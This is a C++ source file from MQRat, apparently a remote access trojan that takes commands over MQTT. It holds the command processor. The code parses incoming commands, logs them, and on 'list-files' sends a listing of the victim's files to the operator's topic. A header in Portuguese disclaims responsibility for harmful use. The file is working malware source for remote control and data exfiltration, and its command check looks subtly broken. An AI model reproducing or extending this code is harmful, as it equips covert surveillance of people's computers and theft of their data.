/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include "command_processor.hpp"
#include "api.hpp"
#include "log.hpp"
#include "mqtt_client.hpp"
#include "utils.hpp"
#include <exception>
#include <string>

CommandProcessor::CommandProcessor(string cmd, void *client)
{
    this->command = cmd;
    this->client = client;
}

void CommandProcessor::Process()
{
    string output = "";
    auto client = static_cast<MqttClient*>(this->client);
    auto send_topic = client->getSendTopic();

    // read the length of public key
    auto s_pubkey_len = this->command.substr(command.length() - 2);
    auto pubkey_len = std::strtoul(s_pubkey_len.c_str(), nullptr, 16);
    auto command_len = command.length() - pubkey_len - s_pubkey_len.length();
    auto raw_command = command.substr(0, command_len);
    auto public_key = command.substr(raw_command.length(), pubkey_len);

    Log::LogInfo("public key size: " + to_string(pubkey_len));
    Log::LogInfo("command size: " + to_string(command_len));
    Log::LogInfo("public key: " + public_key);
    Log::LogInfo("command: " + raw_command);

    // 
    if(command == "list-files") {
        auto files = API::FileSystem::ListFiles();
        client->Publish(files, send_topic);
    } else {
        client->Publish("/error", send_topic);
		Log::LogInfo("Unknown command received");
	}
}
